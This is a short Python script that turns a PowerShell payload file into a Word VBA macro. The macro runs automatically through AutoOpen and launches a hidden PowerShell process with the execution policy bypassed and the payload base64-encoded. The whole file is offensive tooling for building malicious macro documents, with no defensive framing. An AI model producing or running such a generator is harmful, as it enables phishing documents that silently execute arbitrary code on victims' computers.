#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Usage: ./gen_docm_autoopen_payload.py <POWERSHELL_PAYLOAD_FILE.PS1>

import sys
from base64 import b64encode

POWERSHELL_PAYLOAD_FILE = sys.argv[1]
CHUNK_SIZE = 200

with open(POWERSHELL_PAYLOAD_FILE, 'r', encoding='utf-8') as f:
	payload = f.read()

payload = payload.encode('utf-16le')
payload = b64encode(payload).decode()
payload = [payload[i:i+CHUNK_SIZE] for i in range(0, len(payload), CHUNK_SIZE)]
payload = [f'"{chunk}"' for chunk in payload]
payload = ' _\r\n& '.join(payload)

# "Private Sub Document_Open()" not always working
payload = f"""\
Sub AutoOpen()\r
    Text = "powershell -nop -exec bypass -w hidden -e " _\r
& {payload}\r
    a = Shell(Text, vbHide)\r
\r
End Sub"""

print(payload)
